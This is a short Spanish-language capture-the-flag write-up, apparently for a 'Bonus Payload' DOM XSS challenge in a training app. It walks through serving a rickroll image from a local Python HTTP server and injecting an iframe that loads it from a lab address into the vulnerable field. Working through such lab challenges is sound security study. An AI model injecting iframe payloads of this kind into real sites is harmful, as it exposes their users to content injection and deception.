# Bonus Payload
## Use the bonus payload `<iframe ...>` in the DOM XSS challenge.

Este reto consiste en una inyección de código que permite crear una ventana que reproduce contenido externo.

Se personalizó el payload para mostrar una imagen tipo *rickroll* dentro de la página.

### Pasos

- Descargar la imagen del rickroll.
- Crear un archivo HTML:

```html
<html>
  <body>
    <img src="/rick.jpeg" />
  </body>
</html>
````

* Levantar un servidor HTTP simple con Python:

```bash
python3 -m http.server
```

* Inyectar el siguiente código en el campo vulnerable:

```html
<iframe width="100%" height="100" scrolling="no" frameborder="no"
src="http://172.17.0.3:8000/rick.html"></iframe>
```

